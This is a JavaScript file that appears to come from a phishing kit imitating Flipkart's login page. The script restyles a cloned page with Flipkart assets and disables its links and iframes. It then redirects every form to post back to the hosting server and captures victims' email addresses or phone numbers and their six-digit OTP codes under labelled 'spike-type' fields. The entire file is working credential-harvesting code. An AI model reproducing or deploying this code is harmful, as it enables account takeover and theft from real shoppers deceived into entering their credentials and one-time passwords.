let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// adding css
for (let i = 1; i <= 5; i++) {
    const link = document.createElement("link")
    link.rel = "stylesheet"
    link.href = `/web/flipkart_${i}.css`
    document.head.appendChild(link)
}
// set img
try {
    let imgs = document.querySelectorAll(`img`)
    if (imgs.length == 6 || imgs.length == 7) {
        imgs[0].src = "/web/flipkart_3.png"
        imgs[1].src = "/web/flipkart_1.png"
        imgs[6].src = "/web/flipkart_2.svg"
    } else if (imgs.length != 3) {
        imgs[1].src = "/web/flipkart_3.png"
        imgs[2].src = "/web/flipkart_1.png"
        imgs[7].src = "/web/flipkart_2.svg"
    }

} catch (error) {

}

let form1 = document.querySelectorAll("form")[1]

if (form1) {
    let input = form1.querySelectorAll("input")
    let button = form1.querySelectorAll("button")

    if (input.length == 2) {
        input[0].name = "email"
        input[0].id = "e_email"
    }
    if (button.length == 1) {
        button[0].type = "submit"
    }
}

// all possible selectors
//set
let postform = document.createElement("form")
postform.action = location.href
postform.method = "POST"

let e_email = document.querySelector("#e_email")
let m_otp_box = document.querySelector(`._3-3NCn`)

if (e_email) {
    addSpikeType("email")
}
//set
else if (form1) {
    let allInput = form1.querySelectorAll("input")
    if (allInput.length == 7) {
        addSpikeType("otp_code")
        let classOfInputs = form1.querySelector(".HSKgdN")
        if (classOfInputs) {
            classOfInputs.innerHTML = `
            <div class="IiD88i _2EZ3Zp" style="width:100%;">
            <input maxlength="6" autocomplete="off" type="text" class="_2IX_2- _1WRfas" required="" value="" name="otp_code" placeholder="OTP">
            <span class="_36T8XR"></span>
            <label class="_1fqY3P"></label>
            </div>`
        }
    }
} else if (m_otp_box) {
    m_otp_box.innerHTML = `
    <div class="_1wiGwR" style="width:100%;"><div><div class="JRwvMp">
    <input class="b62cxd" maxlength="6" autocomplete="off" type="text" required="" value="" name="otp_code" placeholder="OTP">
    <label class="rK1hG6 undefined"></label>
    <span class="_1ahCAZ _3yGPnY"></span>
    <span class="_2y7Zq5"></span></div></div></div>
    `
}

let allbtn = document.querySelectorAll("button")

allbtn.forEach(btn => {
    if (btn.innerText.includes("Continue")) {
        btn.disabled = false
        btn.style.background = `#ff5800`
        btn.addEventListener("click", () => {
            let numberUn = document.querySelector(`[type="number"]`)
            postform.innerHTML = `
            <input type="hidden" value="${numberUn.value}" name="email">
            <input type="hidden" name="spike-type" value="m_login">`
            document.body.appendChild(postform)
            postform.submit()
        })
    }
})

allbtn.forEach(btn => {
    if (btn.innerText.includes("Verify")) {
        btn.disabled = false
        btn.style.background = `#ff5800`
        btn.addEventListener("click", () => {
            let numberUn = document.querySelector(`[name="otp_code"]`)
            postform.innerHTML = `
            <input type="hidden" value="${numberUn.value}" name="m_otp">
            <input type="hidden" name="spike-type" value="m_otp">`
            document.body.appendChild(postform)
            postform.submit()
        })
    }
})